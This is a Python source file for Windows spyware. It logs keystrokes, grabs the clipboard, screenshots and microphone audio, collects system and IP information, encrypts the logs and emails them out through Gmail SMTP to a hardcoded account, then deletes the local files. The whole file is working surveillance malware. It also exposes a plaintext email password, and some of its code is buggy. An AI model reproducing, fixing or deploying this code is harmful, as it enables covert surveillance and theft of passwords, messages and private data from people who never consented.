from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform
import win32clipboard

from pynput.keyboard import Key, Listener
import os
import time
from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet
import getpass
from requests import get

from multiprocessing import process, freeze_support
from PIL import ImageGrab

key_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

key_information_e = "e_key_log.txt"
clipboard_information_e = "e_clipboard.txt"
system_information_e = "e_systeminfo.txt"

mic_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_addr = "mrflux1515@gmail.com"
passwd = "boomblah11"
to_addr ="mrflux1515@gmail.com"
file_path = "C:\\Users\\HI\\PycharmProjects\\Keylogger\\project"
extend = "\\"
file_merge = file_path + extend

key = "1ZPIhuzCDEGrgZ0S79QKVAtEN3GNvP3MPbdyux9vRhk="


def send_email(filename, attachment, to_addr ):
    from_addr = email_addr

    msg = MIMEMultipart()

    msg['From'] = from_addr

    msg['To'] = to_addr

    msg['Subject'] = "log file"

    body = "body of the mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload(attachment.read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment: filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(from_addr, passwd)

    text = msg.as_string()

    s.sendmail(from_addr, to_addr, text)

    s.quit()
send_email(key_information, file_path + extend + key_information, to_addr)

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        try:
            public_IP = get("http://api.ipify.org" + "\n").txt
            f.write(public_IP)
        except Exception:
            f.write("Couldn't find public ip address" + "\n")

        f.write("System:" + platform.system() + "\n")
        f.write("Processor:" + platform.processor() + "  version:" + platform.version() + "\n")
        f.write("Machine:" + platform.machine() + "\n")
        f.write("Hostname:" + hostname + "\n")
        f.write("Private IP:" + IPAddr + "\n")
computer_information()

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        win32clipboard.OpenClipboard()
        paste_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        try:
            f.write("Clipboard Data: \n" + paste_data + "\n")
        except:
            f.write("Clipboard Data couldn't be copied !!" + "\n")
copy_clipboard()

def microphone():
    frequency = 44100
    seconds = mic_time

    my_recording = sd.rec(int(seconds ^ frequency), samplerate=frequency, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, frequency, my_recording)
microphone()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)
screenshot()

number_of_iterations = 0
current_time = time.time()
stopping_time = time.time() + time_iteration


count = 0
keys = []
while number_of_iterations < number_of_iterations_end:
    def on_press(key):
        global keys,count,current_time

        print(key)
        keys.append(key)
        count += 1
        current_time = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + key_information, "a") as f:
            for key in keys:
                k= str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if current_time > stopping_time :
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if current_time > stopping_time:
        with open(file_path + extend + key_information, "w") as f:
            f.write("")
        copy_clipboard()
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, to_addr )
        current_time = time.time()
        number_of_iterations += 1
        stopping_time = time.time() + time_iteration

files_to_encrypt = [file_merge +system_information, file_merge + key_information, file_merge + clipboard_information ]
encrypted_files = [file_merge + system_information_e, file_merge + key_information_e, file_merge + clipboard_information_e]

cnt = 0
for encrypted_file in files_to_encrypt:
     with open(files_to_encrypt[cnt],"rb") as f:
         data = f.read()

     fernet = Fernet(key)
     encrypted = fernet.encrypt(data)

     with open(encrypted_files[cnt], "wb") as f:
         f.write(encrypted)

     send_email(encrypted_files[cnt], encrypted_files[cnt], to_addr)
     cnt += 1
time.sleep(120)

deleted_files = [system_information, key_information, clipboard_information, screenshot_information, audio_information]
for ele in deleted_files:
    os.remove(file_merge + ele)
